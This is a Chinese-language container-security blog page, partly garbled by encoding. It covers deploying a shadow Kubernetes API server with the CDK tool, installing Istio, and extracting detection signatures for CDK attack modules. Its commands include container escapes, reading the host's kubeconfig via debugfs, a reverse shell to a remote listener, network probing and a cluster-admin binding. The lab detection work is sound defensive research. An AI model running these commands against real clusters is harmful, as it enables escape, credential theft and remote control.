</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-03-31</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 534 words, 1 min 46 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/01/29/%E9%83%A8%E7%BD%B2%E5%BD%B1%E5%AD%90APIServer/">éƒ¨ç½²å½±å­APIServer</a></h3></div><div class="post-content"><div class="card"><p><h2 id="å½±å­APIServer"><a href="#å½±å­APIServer" class="headerlink" title="å½±å­APIServer"></a>å½±å­APIServer</h2><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=839">https://www.cdxy.me/?p=839</a></p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=CH7S5rE3j8w">https://www.youtube.com/watch?v=CH7S5rE3j8w</a></p>
<h2 id="æƒé™é…ç½®"><a href="#æƒé™é…ç½®" class="headerlink" title="æƒé™é…ç½®"></a>æƒé™é…ç½®</h2><p>ä¸ºPodè®¾ç½®é«˜æƒé™çš„ServiceAccountï¼Œé€šè¿‡ClusterRoleå’ŒClusterRoleBindingå®ç°</p>
<p>role.yaml</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;*&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;*&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>rolebinding.yaml</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: cluster-admin-binding</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: default  <span class="comment"># æ›¿æ¢ä¸ºä½ çš„ ServiceAccount åç§°</span></span><br><span class="line">  namespace: cdk-test  <span class="comment"># æ›¿æ¢ä¸ºä½ çš„ Pod æ‰€åœ¨çš„å‘½åç©ºé—´</span></span><br><span class="line">roleRef:</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: cluster-admin</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br></pre></td></tr></table></figure>

<p>åº”ç”¨é›†ç¾¤è§’è‰²</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f role.yaml</span><br><span class="line">kubectl apply -f rolebinding.yaml</span><br></pre></td></tr></table></figure>

<h2 id="CDKåˆ›å»ºå½±å­APIServer"><a href="#CDKåˆ›å»ºå½±å­APIServer" class="headerlink" title="CDKåˆ›å»ºå½±å­APIServer"></a>CDKåˆ›å»ºå½±å­APIServer</h2><p>è¿›å…¥æµ‹è¯•podæ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run k8s-shadow-apiserver default</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å½±å­APIServeråˆ›å»ºæˆåŠŸ</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240129134404640.png"></p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240129134613665.png" alt="image-20240129134613665"></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-29</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 171 words, 34 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/01/26/%E8%99%9A%E6%8B%9F%E6%9C%BAk8s%E9%9B%86%E7%BE%A4%E5%AE%89%E8%A3%85istio/">è™šæ‹Ÿæœºk8sé›†ç¾¤å®‰è£…istio</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h2 id="ä¸‹è½½istio"><a href="#ä¸‹è½½istio" class="headerlink" title="ä¸‹è½½istio"></a>ä¸‹è½½istio</h2><p>åœ¨releaseé¡µé¢ä¸‹è½½åˆé€‚çš„ç‰ˆæœ¬å‹ç¼©åŒ…ï¼Œæ”¾åˆ°ä½ çš„å®‰è£…ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/istio/istio/releases</span><br></pre></td></tr></table></figure>

<p>ï¼ˆå¦‚æœç½‘ç»œå…è®¸å¯ä»¥ä½¿ç”¨wgetä¸‹è½½releaseåŒ…ï¼‰</p>
<p>è§£å‹istioå®‰è£…åŒ…</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf istio-1.18.1-linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>å„ä¸ªç›®å½•çš„ä½œç”¨ï¼š</p>
<ul>
<li>binï¼šå­˜æ”¾çš„æ˜¯ istioctl å·¥å…·</li>
<li>manifestsï¼šç›¸å…³ yaml ç”¨äºéƒ¨ç½² Istioçš„</li>
<li>samplesï¼šä¸€äº› Demo ç”¨çš„ yaml</li>
<li>toolsï¼šä¸€äº›å·¥å…·</li>
</ul>
<p>è¿›å…¥è§£å‹åçš„ç›®å½•å°†istioctlå·¥å…·æ”¾ç½®åœ¨binç›®å½•æ–¹ä¾¿æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> istio-1.18.1</span><br><span class="line"><span class="built_in">cp</span> bin/istioctl /usr/local/bin/</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…istio"><a href="#å®‰è£…istio" class="headerlink" title="å®‰è£…istio"></a>å®‰è£…istio</h2><p>å®‰è£…æ¼”ç¤ºistioç¯å¢ƒ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">istioctl install --<span class="built_in">set</span> profile=demo -y</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240126212832655.png" alt="image-20240126212832655"></p>
<p>ç»™ä½ æƒ³è¦å‘½åç©ºé—´ï¼Œä¾‹å¦‚ï¼šdefaultï¼Œæ‰“ä¸Š labelï¼Œå‘Šè¯‰ Istio åœ¨éƒ¨ç½²åº”ç”¨çš„æ—¶å€™ï¼Œè‡ªåŠ¨æ³¨å…¥ Envoy è¾¹è½¦ä»£ç†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label namespace default istio-injection=enabled</span><br></pre></td></tr></table></figure>

<p>éªŒè¯å®‰è£…æˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…ˆæ ¹æ®å®‰è£…çš„profileå¯¼å‡ºmanifest</span></span><br><span class="line">istioctl manifest generate --<span class="built_in">set</span> profile=demo &gt; <span class="variable">$HOME</span>/generated-manifest.yaml</span><br><span class="line"><span class="comment"># ç„¶åæ ¹æ®éªŒè¯å®é™…ç¯å¢ƒå’Œmanifestæ–‡ä»¶æ˜¯å¦ä¸€è‡´</span></span><br><span class="line">istioctl verify-install -f <span class="variable">$HOME</span>/generated-manifest.yaml</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240126220607815.png" alt="image-20240126220607815"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹istioéƒ¨ç½²çš„pod</span></span><br><span class="line">kubectl get pods -n istio-system</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240126220811008.png" alt="image-20240126220811008"></p>
<p>å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://www.lixueduan.com/posts/istio/01-install/">https://www.lixueduan.com/posts/istio/01-install/</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-26</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 274 words, 54 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/01/17/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7CDK%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B/">è‡ªåŠ¨åŒ–æ¸—é€å·¥å…·CDKç‰¹å¾æ£€æµ‹</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<ul>
<li><input disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-docker-runc CVE-2019-5736 </li>
<li><input disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-containerd-shim CVE-2020-15257       </li>
<li><input checked="" disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-docker.socké€ƒé€¸PoC(docker-in-docker) </li>
<li><input checked="" disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-docker.sockå‘½ä»¤æ‰§è¡Œ                  </li>
<li><input checked="" disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-Docker API(2375)å‘½ä»¤æ‰§è¡Œ             </li>
<li><input checked="" disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-æŒ‚è½½é€ƒé€¸(ç‰¹æƒå®¹å™¨)                   </li>
<li><input checked="" disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-Cgroupé€ƒé€¸(ç‰¹æƒå®¹å™¨)                 </li>
<li><input checked="" disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-Procfsç›®å½•æŒ‚è½½é€ƒé€¸                   </li>
<li><input disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-Ptraceé€ƒé€¸PoC                        </li>
<li><input checked="" disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-lxcfs cgroupé”™è¯¯é…ç½®é€ƒé€¸            </li>
<li><input checked="" disabled="" type="checkbox"> å®¹å™¨é€ƒé€¸-é‡å†™Cgroupä»¥è®¿é—®è®¾å¤‡                 </li>
<li><input checked="" disabled="" type="checkbox"> ç½‘ç»œæ¢æµ‹-K8sç»„ä»¶æ¢æµ‹                          </li>
<li><input checked="" disabled="" type="checkbox"> ä¿¡æ¯æ”¶é›†-æ£€æŸ¥å’Œè·å–Istioå…ƒä¿¡æ¯                </li>
<li><input checked="" disabled="" type="checkbox"> è¿œç¨‹æ§åˆ¶-åå¼¹shell                            </li>
<li><input disabled="" type="checkbox"> ä¿¡æ¯çªƒå–-æš´åŠ›ç ´è§£é•œåƒæºè´¦å·                   </li>
<li><input disabled="" type="checkbox"> ä¿¡æ¯çªƒå–-æ‰«æAKåŠAPIè®¤è¯å‡­æ®                  </li>
<li><input disabled="" type="checkbox"> ä¿¡æ¯çªƒå–-çªƒå–K8s Secrets                      </li>
<li><input disabled="" type="checkbox"> ä¿¡æ¯çªƒå–-çªƒå–K8s Config                       </li>
<li><input disabled="" type="checkbox"> ä¿¡æ¯çªƒå–-è·å–K8s Pod Security Policies        </li>
<li><input disabled="" type="checkbox"> æƒé™æå‡-K8s RBACç»•è¿‡                         </li>
<li><input disabled="" type="checkbox"> æŒä¹…åŒ–-éƒ¨ç½²WebShell                         </li>
<li><input checked="" disabled="" type="checkbox"> æŒä¹…åŒ–-éƒ¨ç½²åé—¨Pod                          </li>
<li><input checked="" disabled="" type="checkbox"> æŒä¹…åŒ–-éƒ¨ç½²å½±å­K8s api-server              </li>
<li><input disabled="" type="checkbox"> æŒä¹…åŒ–-K8s MITMæ”»å‡»(CVE-2020-8554)      </li>
<li><input checked="" disabled="" type="checkbox"> æŒä¹…åŒ–-éƒ¨ç½²K8s CronJob</li>
</ul>
<h2 id="CDKç½‘ç»œæ¢æµ‹-k8sç»„ä»¶æ¢æµ‹"><a href="#CDKç½‘ç»œæ¢æµ‹-k8sç»„ä»¶æ¢æµ‹" class="headerlink" title="CDKç½‘ç»œæ¢æµ‹-k8sç»„ä»¶æ¢æµ‹"></a>CDKç½‘ç»œæ¢æµ‹-k8sç»„ä»¶æ¢æµ‹</h2><p>è¿›å…¥æµ‹è¯•å®¹å™¨ä¸­æŸ¥çœ‹k8sç¯å¢ƒå˜é‡</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> |grep KUBE</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117102257655.png" alt="image-20240117102257655"></p>
<p>ç½‘ç»œæ¢æµ‹æ‰«ææ•´ä¸ªCæ®µä¸­å¼€æ”¾çš„k8s apiç«¯ç‚¹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run service-probe 10.96.0.1-255</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117102547217.png" alt="image-20240117102547217"></p>
<h3 id="ç‰¹å¾æå–"><a href="#ç‰¹å¾æå–" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾"><a href="#è¿›ç¨‹ç‰¹å¾" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>ç”±äºæ‰«æçš„æ—¶é—´é•¿ï¼Œè¯¥è¿›ç¨‹å¾ˆå®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Œä»¥bashä¸ºçˆ¶è¿›ç¨‹ï¼Œcdkä¸ºå­è¿›ç¨‹ï¼›cdkçš„å‚æ•°ä¸ºrun service-probe [IPèŒƒå›´]ã€‚</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117102649759.png" alt="image-20240117102649759"></p>
<h4 id="å‘½ä»¤ç‰¹å¾"><a href="#å‘½ä»¤ç‰¹å¾" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run service-probe [IPèŒƒå›´]</span><br></pre></td></tr></table></figure>

<h2 id="CDKå®¹å™¨é€ƒé€¸-lxcfs-cgroupé”™è¯¯é…ç½®é€ƒé€¸"><a href="#CDKå®¹å™¨é€ƒé€¸-lxcfs-cgroupé”™è¯¯é…ç½®é€ƒé€¸" class="headerlink" title="CDKå®¹å™¨é€ƒé€¸-lxcfs cgroupé”™è¯¯é…ç½®é€ƒé€¸"></a>CDKå®¹å™¨é€ƒé€¸-lxcfs cgroupé”™è¯¯é…ç½®é€ƒé€¸</h2><p>è¿è¡Œcdké€ƒé€¸è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run lxcfs-rw</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183339381.png" alt="image-20240116183339381"></p>
<p>è¿è¡ŒdebugfsæŸ¥çœ‹host_devæ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugfs -w host_dev</span><br><span class="line"><span class="built_in">cat</span> /root/.kube/config</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183421548.png" alt="image-20240116183421548"></p>
<h3 id="ç‰¹å¾æå–-1"><a href="#ç‰¹å¾æå–-1" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-1"><a href="#è¿›ç¨‹ç‰¹å¾-1" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>ï¼ˆè¿™é‡Œæ¢æˆäº†ubuntué•œåƒå¥½æŸ¥çœ‹è¿›ç¨‹ç»†èŠ‚ï¼‰</p>
<p>è¿™ä¸ªä¸æ˜¯çŸ­è¿›ç¨‹ï¼ŒæŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ï¼Œbashä¸ºçˆ¶è¿›ç¨‹ï¼Œdebugfsä¸ºå­è¿›ç¨‹ï¼ˆå‚æ•°ä¸º-w cdk-testï¼Œå¦‚æœæ˜¯ä½¿ç”¨cdkåˆ™å‚æ•°å›ºå®šä¸º-w host_devï¼‰</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116175344403.png" alt="image-20240116175344403"></p>
<h4 id="å‘½ä»¤ç‰¹å¾-1"><a href="#å‘½ä»¤ç‰¹å¾-1" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><p>ä»¥ä¸‹çš„å‘½ä»¤éƒ½æ˜¯å›ºå®šçš„ï¼Œä¹Ÿæ˜¯ç”±äºCDKå†…ç½®çš„åŸå› </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cdk run lxcfs-rw</span><br><span class="line"> debugfs -w host_dev</span><br></pre></td></tr></table></figure>

<h2 id="CDKå®¹å™¨é€ƒé€¸-é‡å†™cgroupä»¥è®¿é—®è®¾å¤‡"><a href="#CDKå®¹å™¨é€ƒé€¸-é‡å†™cgroupä»¥è®¿é—®è®¾å¤‡" class="headerlink" title="CDKå®¹å™¨é€ƒé€¸-é‡å†™cgroupä»¥è®¿é—®è®¾å¤‡"></a>CDKå®¹å™¨é€ƒé€¸-é‡å†™cgroupä»¥è®¿é—®è®¾å¤‡</h2><p>ç”±äºè¿™ä¸ªå’Œä¸Šé¢çš„lxcfs cgroupé”™è¯¯é…ç½®é€ƒé€¸ååˆ†ç›¸ä¼¼äºæ˜¯æ²¡æœ‰è¿›è¡Œå¤ç°</p>
<h3 id="ç‰¹å¾æå–-2"><a href="#ç‰¹å¾æå–-2" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-2"><a href="#è¿›ç¨‹ç‰¹å¾-2" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>çˆ¶è¿›ç¨‹ä¸ºbashï¼Œå­è¿›ç¨‹ä¸ºdebugfsï¼Œå‚æ•°ä¸ºcdk_mknod_result</p>
<h4 id="å‘½ä»¤ç‰¹å¾-2"><a href="#å‘½ä»¤ç‰¹å¾-2" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cdk run rewrite-cgroup-devices </span><br><span class="line">debugfs cdk_mknod_result</span><br></pre></td></tr></table></figure>

<h2 id="CDKè¿œç¨‹æ§åˆ¶-åå¼¹shell"><a href="#CDKè¿œç¨‹æ§åˆ¶-åå¼¹shell" class="headerlink" title="CDKè¿œç¨‹æ§åˆ¶-åå¼¹shell"></a>CDKè¿œç¨‹æ§åˆ¶-åå¼¹shell</h2><p>è¿œç¨‹æœåŠ¡å™¨ç›‘å¬ç«¯å£</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 14444</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117104622305.png" alt="image-20240117104622305"></p>
<p>è¿›å…¥æµ‹è¯•å®¹å™¨æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run reverse-shell IP:ç«¯å£</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117104557076.png" alt="image-20240117104557076"></p>
<h3 id="ç‰¹å¾æå–-3"><a href="#ç‰¹å¾æå–-3" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-3"><a href="#è¿›ç¨‹ç‰¹å¾-3" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>è¿™ä¸ªä¸æ˜¯çŸ­è¿›ç¨‹ï¼Œä»¥bashä¸ºçˆ¶è¿›ç¨‹ï¼Œcdkä¸ºå­è¿›ç¨‹ï¼Œå‚æ•°ä¸ºrun reverse-shell IP:ç«¯å£</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117104712082.png" alt="image-20240117104712082"></p>
<h4 id="å‘½ä»¤ç‰¹å¾-3"><a href="#å‘½ä»¤ç‰¹å¾-3" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run reverse-shell IP:ç«¯å£</span><br></pre></td></tr></table></figure>

<h2 id="CDKå®¹å™¨é€ƒé€¸-docker-socké€ƒé€¸PoC-docker-in-docker"><a href="#CDKå®¹å™¨é€ƒé€¸-docker-socké€ƒé€¸PoC-docker-in-docker" class="headerlink" title="CDKå®¹å™¨é€ƒé€¸-docker.socké€ƒé€¸PoC(docker-in-docker)"></a>CDKå®¹å™¨é€ƒé€¸-docker.socké€ƒé€¸PoC(docker-in-docker)</h2><p>è¿›å…¥æµ‹è¯•å®¹å™¨ï¼Œå†™ä¸€ä¸ªé‡å¤æ‰§è¡Œçš„è„šæœ¬å»æ‰§è¡ŒCDKå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    ./cdk run docker-sock-check /var/run/docker.sock</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="ç‰¹å¾æå–-4"><a href="#ç‰¹å¾æå–-4" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-4"><a href="#è¿›ç¨‹ç‰¹å¾-4" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>docker.sockçš„æŒ‚è½½ä½ç½®å¯èƒ½æ”¹å˜ã€‚</p>
<p>çˆ¶è¿›ç¨‹ä¸ºbashï¼Œå­è¿›ç¨‹ä¸ºcdkï¼Œæ‰§è¡Œçš„å‘½ä»¤å‚æ•°ä¸ºrun docker-sock-check [docker.sockæŒ‚è½½ä½ç½®]</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118102141321.png" alt="image-20240118102141321"></p>
<h4 id="å‘½ä»¤ç‰¹å¾-4"><a href="#å‘½ä»¤ç‰¹å¾-4" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-check  [docker.sockæŒ‚è½½ä½ç½®]</span><br></pre></td></tr></table></figure>

<h2 id="CDKå®¹å™¨é€ƒé€¸-docker-sockå‘½ä»¤æ‰§è¡Œ"><a href="#CDKå®¹å™¨é€ƒé€¸-docker-sockå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="CDKå®¹å™¨é€ƒé€¸-docker.sockå‘½ä»¤æ‰§è¡Œ"></a>CDKå®¹å™¨é€ƒé€¸-docker.sockå‘½ä»¤æ‰§è¡Œ</h2><p>è¿›å…¥æµ‹è¯•å®¹å™¨æ‰§è¡ŒCDKå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-pwn /var/run/docker.sock <span class="built_in">touch</span> /host/tmp/pwn-success</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118104324387.png" alt="image-20240118104324387"></p>
<h3 id="ç‰¹å¾æå–-5"><a href="#ç‰¹å¾æå–-5" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-5"><a href="#è¿›ç¨‹ç‰¹å¾-5" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>çˆ¶è¿›ç¨‹ä¸ºbashï¼Œå­è¿›ç¨‹ä¸ºcdkï¼Œå‚æ•°ä¸ºrun docker-sock-pwn [docker.sockä½ç½®] [CMDå‘½ä»¤]</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118104435091.png" alt="image-20240118104435091"></p>
<h4 id="å‘½ä»¤ç‰¹å¾-5"><a href="#å‘½ä»¤ç‰¹å¾-5" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-pwn [docker.sockä½ç½®] [CMDå‘½ä»¤]</span><br></pre></td></tr></table></figure>

<h2 id="CDKå®¹å™¨é€ƒé€¸-æŒ‚è½½é€ƒé€¸-ç‰¹æƒå®¹å™¨"><a href="#CDKå®¹å™¨é€ƒé€¸-æŒ‚è½½é€ƒé€¸-ç‰¹æƒå®¹å™¨" class="headerlink" title="CDKå®¹å™¨é€ƒé€¸-æŒ‚è½½é€ƒé€¸(ç‰¹æƒå®¹å™¨)"></a>CDKå®¹å™¨é€ƒé€¸-æŒ‚è½½é€ƒé€¸(ç‰¹æƒå®¹å™¨)</h2><p>è¿›å…¥æµ‹è¯•å®¹å™¨ï¼Œå†™ä¸€ä¸ªé‡å¤æ‰§è¡Œçš„è„šæœ¬æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    ./cdk run mount-disk</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118111207956.png" alt="image-20240118111207956"></p>
